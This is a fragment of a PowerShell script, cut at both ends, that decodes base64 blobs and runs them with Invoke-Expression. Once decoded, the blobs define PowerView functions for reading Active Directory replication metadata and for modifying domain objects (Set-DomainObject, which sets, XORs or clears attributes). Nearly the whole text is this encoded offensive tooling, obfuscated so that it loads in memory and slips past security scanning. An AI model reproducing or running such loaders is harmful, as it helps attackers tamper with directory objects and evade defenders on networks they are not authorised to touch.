tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmF3CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnICAgID0gICAnbXNkcy1yZXBsYXR0cmlidXRlbWV0YWRhdGEnLCdkaXN0aW5ndWlzaGVkbmFtZScKICAgICAgICAgICAgJ1JhdycgICAgICAgICAgID0gICAkVHJ1ZQogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJExEQVBGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0ZpbmRPbmUnXSA9ICRGaW5kT25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7CiAgICAgICAgICAgICRQcm9wZXJ0eUZpbHRlciA9ICRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddIC1Kb2luICd8JwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFByb3BlcnR5RmlsdGVyID0gJycKICAgICAgICB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydJZGVudGl0eSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRJZGVudGl0eSB9CiAgICAgICAgR2V0LURvbWFpbk9iamVjdCBAU2VhcmNoZXJBcmd1bWVudHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRPYmplY3RETiA9ICRfLlByb3BlcnRpZXNbJ2Rpc3Rpbmd1aXNoZWRuYW1lJ11bMF0KICAgICAgICAgICAgRm9yRWFjaCgkWE1MTm9kZSBpbiAkXy5Qcm9wZXJ0aWVzWydtc2RzLXJlcGxhdHRyaWJ1dGVtZXRhZGF0YSddKSB7CiAgICAgICAgICAgICAgICAkVGVtcE9iamVjdCA9IFt4bWxdJFhNTE5vZGUgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSAnRFNfUkVQTF9BVFRSX01FVEFfREFUQScgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgICAgIGlmICgkVGVtcE9iamVjdCkgewogICAgICAgICAgICAgICAgICAgIGlmICgkVGVtcE9iamVjdC5wc3pBdHRyaWJ1dGVOYW1lIC1NYXRjaCAkUHJvcGVydHlGaWx0ZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdPYmplY3RETicgJE9iamVjdEROCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnQXR0cmlidXRlTmFtZScgJFRlbXBPYmplY3QucHN6QXR0cmlidXRlTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0xhc3RPcmlnaW5hdGluZ0NoYW5nZScgJFRlbXBPYmplY3QuZnRpbWVMYXN0T3JpZ2luYXRpbmdDaGFuZ2UKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdWZXJzaW9uJyAkVGVtcE9iamVjdC5kd1ZlcnNpb24KICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdMYXN0T3JpZ2luYXRpbmdEc2FETicgJFRlbXBPYmplY3QucHN6TGFzdE9yaWdpbmF0aW5nRHNhRE4KICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuQURPYmplY3RBdHRyaWJ1dGVIaXN0b3J5JykKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT2JqZWN0QXR0cmlidXRlSGlzdG9yeV0gRXJyb3IgcmV0cmlldmluZyAnbXNkcy1yZXBsYXR0cmlidXRlbWV0YWRhdGEnIGZvciAnJE9iamVjdEROJyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbk9iamVjdExpbmtlZEF0dHJpYnV0ZUhpc3RvcnkgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlRGVjbGFyZWRWYXJzTW9yZVRoYW5Bc3NpZ25tZW50cycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuQURPYmplY3RMaW5rZWRBdHRyaWJ1dGVIaXN0b3J5JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJywgJ01lbWJlckRpc3Rpbmd1aXNoZWROYW1lJywgJ01lbWJlck5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmF3CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnICAgID0gICAnbXNkcy1yZXBsdmFsdWVtZXRhZGF0YScsJ2Rpc3Rpbmd1aXNoZWRuYW1lJwogICAgICAgICAgICAnUmF3JyAgICAgICAgICAgPSAgICRUcnVlCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgewogICAgICAgICAgICAkUHJvcGVydHlGaWx0ZXIgPSAkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSAtSm9pbiAnfCcKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRQcm9wZXJ0eUZpbHRlciA9ICcnCiAgICAgICAgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snSWRlbnRpdHknXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkSWRlbnRpdHkgfQogICAgICAgIEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkT2JqZWN0RE4gPSAkXy5Qcm9wZXJ0aWVzWydkaXN0aW5ndWlzaGVkbmFtZSddWzBdCiAgICAgICAgICAgIEZvckVhY2goJFhNTE5vZGUgaW4gJF8uUHJvcGVydGllc1snbXNkcy1yZXBsdmFsdWVtZXRhZGF0YSddKSB7CiAgICAgICAgICAgICAgICAkVGVtcE9iamVjdCA9IFt4bWxdJFhNTE5vZGUgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSAnRFNfUkVQTF9WQUxVRV9NRVRBX0RBVEEnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICAgICBpZiAoJFRlbXBPYmplY3QpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJFRlbXBPYmplY3QucHN6QXR0cmlidXRlTmFtZSAtTWF0Y2ggJFByb3BlcnR5RmlsdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnT2JqZWN0RE4nICRPYmplY3RETgogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0F0dHJpYnV0ZU5hbWUnICRUZW1wT2JqZWN0LnBzekF0dHJpYnV0ZU5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdBdHRyaWJ1dGVWYWx1ZScgJFRlbXBPYmplY3QucHN6T2JqZWN0RG4KICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdUaW1lQ3JlYXRlZCcgJFRlbXBPYmplY3QuZnRpbWVDcmVhdGVkCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnVGltZURlbGV0ZWQnICRUZW1wT2JqZWN0LmZ0aW1lRGVsZXRlZAogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0xhc3RPcmlnaW5hdGluZ0NoYW5nZScgJFRlbXBPYmplY3QuZnRpbWVMYXN0T3JpZ2luYXRpbmdDaGFuZ2UKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdWZXJzaW9uJyAkVGVtcE9iamVjdC5kd1ZlcnNpb24KICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdMYXN0T3JpZ2luYXRpbmdEc2FETicgJFRlbXBPYmplY3QucHN6TGFzdE9yaWdpbmF0aW5nRHNhRE4KICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuQURPYmplY3RMaW5rZWRBdHRyaWJ1dGVIaXN0b3J5JykKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT2JqZWN0TGlua2VkQXR0cmlidXRlSGlzdG9yeV0gRXJyb3IgcmV0cmlldmluZyAnbXNkcy1yZXBsdmFsdWVtZXRhZGF0YScgZm9yICckT2JqZWN0RE4nIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gU2V0LURvbWFpbk9iamVjdCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VTaG91bGRQcm9jZXNzRm9yU3RhdGVDaGFuZ2luZ0Z1bmN0aW9ucycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRGlzdGluZ3Vpc2hlZE5hbWUnLCAnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1JlcGxhY2UnKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRTZXQsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRYT1IsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENsZWFyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAeydSYXcnID0gJFRydWV9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydJZGVudGl0eSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRJZGVudGl0eSB9CiAgICAgICAgJFJhd09iamVjdCA9IEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgRm9yRWFjaCAoJE9iamVjdCBpbiAkUmF3T2JqZWN0KSB7CiAgICAgICAgICAgICRFbnRyeSA9ICRSYXdPYmplY3QuR2V0RGlyZWN0b3J5RW50cnkoKQogICAgICAgICAgICBpZigkUFNCb3VuZFBhcmFtZXRlcnNbJ1NldCddKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRQU0JvdW5kUGFyYW1ldGVyc1snU2V0J10uR2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbU2V0LURvbWFpbk9iamVjdF0gU2V0dGluZyAnJCgkXy5OYW1lKScgdG8gJyQoJF8uVmFsdWUpJyBmb3Igb2JqZWN0ICckKCRSYXdPYmplY3QuUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZSknIgogICAgICAgICAgICAgICAgICAgICAgICAkRW50cnkucHV0KCRfLk5hbWUsICRfLlZhbHVlKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkRW50cnkuY29tbWl0Y2hhbmdlcygpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW1NldC1Eb21haW5PYmplY3RdIEVycm9yIHNldHRpbmcvcmVwbGFjaW5nIHByb3BlcnRpZXMgZm9yIG9iamVjdCAnJCgkUmF3T2JqZWN0LlByb3BlcnRpZXMuc2FtYWNjb3VudG5hbWUpJyA6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRQU0JvdW5kUGFyYW1ldGVyc1snWE9SJ10pIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJFBTQm91bmRQYXJhbWV0ZXJzWydYT1InXS5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0eU5hbWUgPSAkXy5OYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0eVhvclZhbHVlID0gJF8uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1NldC1Eb21haW5PYmplY3RdIFhPUmluZyAnJFByb3BlcnR5TmFtZScgd2l0aCAnJFByb3BlcnR5WG9yVmFsdWUnIGZvciBvYmplY3QgJyQoJFJhd09iamVjdC5Qcm9wZXJ0aWVzLnNhbWFjY291bnRuYW1lKSciCiAgICAgICAgICAgICAgICAgICAgICAgICRUeXBlTmFtZSA9ICRFbnRyeS4kUHJvcGVydHlOYW1lWzBdLkdldFR5cGUoKS5uYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0eVZhbHVlID0gJCgkRW50cnkuJFByb3BlcnR5TmFtZSkgLWJ4b3IgJFByb3BlcnR5WG9yVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgJEVudHJ5LiRQcm9wZXJ0eU5hbWUgPSAkUHJvcGVydHlWYWx1ZSAtYXMgJFR5cGVOYW1lCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRFbnRyeS5jb21taXRjaGFuZ2VzKCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpbk9iamVjdF0gRXJyb3IgWE9SJ2luZyBwcm9wZXJ0aWVzIGZvciBvYmplY3QgJyQoJFJhd09iamVjdC5Qcm9wZXJ0aWVzLnNhbWFjY291bnRuYW1lKScgOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZigkUFNCb3VuZFBhcmFtZXRlcnNbJ0NsZWFyJ10pIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJFBTQm91bmRQYXJhbWV0ZXJzWydDbGVhciddIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkUHJvcGVydHlOYW1lID0gJF8KICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1NldC1Eb21haW5PYmplY3RdIENsZWFyaW5nICckUHJvcGVydHlOYW1lJyBmb3Igb2JqZWN0ICckKCRSYXdPYmplY3QuUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZSknIgogICAgICAgICAgICAgICAgICAgICAgICAkRW50cnkuJFByb3BlcnR5TmFtZS5jbGVhcigpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRFbnRyeS5jb21taXRjaGFuZ2VzKCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpbk9iamVjdF0gRXJyb3IgY2xlYXJpbmcgcHJvcGVydGllcyBmb3Igb2JqZWN0ICckKCRSYXdPYmplY3QuUHJvcGVydGllcy5zYW1hY2NvdW50bmFt